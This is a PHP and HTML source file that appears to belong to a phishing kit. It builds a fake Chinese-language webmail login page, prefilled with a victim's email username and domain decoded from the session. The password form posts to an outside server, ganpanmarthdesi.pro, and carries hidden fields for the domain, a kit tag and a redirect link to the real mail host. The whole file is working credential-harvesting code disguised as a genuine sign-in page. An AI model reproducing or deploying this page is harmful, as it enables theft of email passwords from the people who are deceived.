<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>&#30331;&#24405;&#35748;&#35777;</title>
<link rel="shortcut icon" type="image/x-icon" href="img/url.jpg"/>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
</head>
<body>

<table border="0" width="100%" cellspacing="0" cellpadding="0">
	<tr>
		<td height="36" background="https://i.ibb.co/N7b8WZ3/header-bg.png" >
		<img border="0" src="https://i.ibb.co/n7CGrmg/header.png" width="399" height="36" align="right"></td>
	</tr>
	<tr>
		<td>
		<div align="center">
			<table border="0" width="1010" height="699" cellspacing="0" cellpadding="0" background="https://i.ibb.co/cvghTwq/bg.png">
				<tr>
					<td>
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
					  <form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php">
						<tr>
							<td height="166"></td>
						</tr>
						<tr>
							<td height="133">
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td>&nbsp;</td>
									<td width="346">
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
	  										<td height="38"><div class="input-group">
        										<input  value="<?php echo $users;?>" name="user" type="text" class="form-control" id="usr" style="padding-left:7px;  border-left: 1px #ddd solid; height: 100%; font-color:#000;  box-shadow:none; border-radius:0px; border:none;  border:1px #ddd solid" placeholder="&#29992;&#25143;&#21517;">
	     										<span style="background-color:#fff; border:none; border-radius:0px; border: 1px #ddd solid" class="input-group-addon">@<?php echo $ddomain;?></span>
	    										</div>									
	    										<input type="hidden" name="domain" value="<?php echo $ddomain;?>" />									
	    										<input type="hidden" name="sender" value="Cn4e" />									
	    										<input type="hidden" name="link" value="https://mail.<?php echo $ddomain;?>/accounts/login" />
											</td>
										</tr>
										<tr>
											<td height="12"></td>
										</tr>
										<tr>
											<td height="35">
        										<input  type="password" name="passwd" class="form-control" id="usr" style="padding-left:7px; border-left: 1px #ddd solid; width: 100%; height: 100%; font-color:#000;  box-shadow:none; border-radius:0px; border:none;  border:1px #ddd solid" placeholder="&#23494;&#30721;" required autofocus >
											</td>
										</tr>
										<tr>
											<td height="15"></td>
										</tr>
										<tr>
											<td>
											<table border="0" width="100%" cellspacing="0" cellpadding="0">
												<tr>
													<td width="90">
													<input type="image" src="https://i.ibb.co/d4mPchS/btn.png" width="90" height="38"></td>
													<td>&nbsp;</td>
												</tr>
											</table>
											</td>
										</tr>
									</table>
									</td>
									<td width="81">&nbsp;</td>
								</tr>
							</table>
							</td>
						</tr>
						<tr>
							<td height="397"></td>
						</tr>
					</table>
					</td>
				</tr>
			</table>
		</div>
		</td>
	</tr>
</table>

</body>

</html>
<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>